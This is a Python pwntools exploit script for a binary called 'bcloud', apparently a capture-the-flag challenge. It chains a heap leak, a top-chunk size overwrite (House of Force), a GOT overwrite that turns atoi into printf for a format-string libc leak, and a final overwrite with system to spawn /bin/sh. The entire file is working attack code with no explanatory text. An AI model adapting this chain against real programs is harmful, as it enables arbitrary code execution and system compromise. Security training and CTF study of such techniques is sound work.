from pwn import *

e = ELF("./bcloud")
printf_plt = e.plt['printf']
printf_got = e.got['printf']
puts_plt = e.plt['puts']
puts_got = e.got['puts']
exit_got = e.got['exit']
atoi_got = e.got['atoi']

l = ELF("/lib/i386-linux-gnu/libc.so.6")
system_got = l.symbols['system']

p = process("./bcloud")
print p.recv()
p.send("a"*0x40)
p.recvuntil("a"*0x40)
heap_addr = u32(p.recv(4))	# leak
print p.recv()
log.info("*** leaked heap address : {} ***".format(hex(heap_addr)))

p.send("a"*0x40)
p.sendline("\xff"*4)		# overwrite top chunk
top_addr = heap_addr+0xd8
log.info("*** top chunk address : {} ***".format(hex(top_addr)))

target_addr = atoi_got
length = target_addr - top_addr - 0x8
log.info("*** target address : {} ***".format(hex(target_addr)))

print p.recv()
p.sendline("1")
print p.recv()
p.sendline(str(length-4))
print p.recv()
p.sendline("a")			# set target

print p.recv()
p.sendline("1")
print p.recv()
p.sendline(str(0x30-4))
print p.recv()
p.sendline("a"*4+p32(printf_plt))	# make fsb
print p.recv()

p.sendline("%3$x")
leaked = int(p.recv(8),16)	# libc leak
print hex(leaked)
libcbase = leaked - (0xf7e5a696-0xf7e11000)
log.info("*** libc base : {} ***".format(hex(libcbase)))
print p.recv()

p.sendline("a"*3)		# edit
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("a"*4 + p32(libcbase+system_got))
print p.recv()
p.send("/bin/sh\x00")
p.interactive()
